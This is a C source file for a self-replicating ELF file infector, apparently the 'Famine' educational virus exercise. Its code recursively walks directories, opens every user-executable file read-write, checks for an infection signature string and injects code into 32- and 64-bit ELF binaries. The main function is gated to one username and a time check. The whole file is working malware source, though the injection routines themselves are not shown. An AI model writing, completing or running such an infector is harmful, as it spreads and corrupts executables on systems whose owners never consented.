#include "famine.h"

int inject_data(unsigned char *file) {
    int archi = file[4];
    if (archi == 1)
        handle_32(file);
    else if (archi == 2)
        handle_64(file);
    else
        return -1;
    return 0;
}

int open_file_exec(char *name_file) {
    int fd = open(name_file, O_RDWR);
    if (fd == -1)
        return -1;
    unsigned long file_size = lseek(fd, 0, SEEK_END);
    if (file_size <= 0){
        close(fd);
        return -1;
    }

    unsigned char *file = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (file == MAP_FAILED) {
        close(fd);
        return -1;
    }

    if (memmem(file, file_size, "Famine version 0.7", strlen("Famine version 0.7"))) {
        munmap(file, file_size);
        close(fd);
        return -1;
    }

    inject_data(file);
    munmap(file, file_size);
    close(fd);
    return 0;
}

void enter_folder(char *folder) {
    struct dirent *dir;

    if (!strcmp(folder, EXEC_FOLDER) || !strcmp(folder, "/home/zarbiy/Documents/Pestilence"))
        return ;

    DIR *d = opendir(folder);
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            char path[1024] = "\0";
            if (dir->d_type == DT_REG) {
                struct stat st;

                snprintf(path, sizeof(path), "%s/%s", folder, dir->d_name);
                if (stat(path, &st) == 0) {
                    if (st.st_mode & S_IXUSR) {
                        if (ACTIVE_SHOW)
                            exec_cmd(path, 0);
                        if (open_file_exec(path) != -1) {
                            if (ACTIVE_SHOW)
                                exec_cmd(path, 0);
                        }
                    }
                    else {
                        if (ACTIVE_SHOW)
                            exec_cmd(path, 1);
                        if (handle_other_file(path) != -1) {
                            if (ACTIVE_SHOW)
                                exec_cmd(path, 1);
                        }
                    }
                }
            }
            else if (dir->d_type == DT_DIR) {
                if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
                    snprintf(path, sizeof(path), "%s/%s", folder, dir->d_name);
                    enter_folder(path);
                }
            }
        }
        closedir(d);
    }
    return ;
}

int main() {
    char *name_folder[] = {START_FOLDER, NULL};
    int i = 0;

    if(check_time() == 0 || check_user("zarbiy") != 0)
        return 0;

    while (name_folder[i]) {
        enter_folder(name_folder[i]);
        i++;
    }
    printf("Done\n");
    return 0;
}
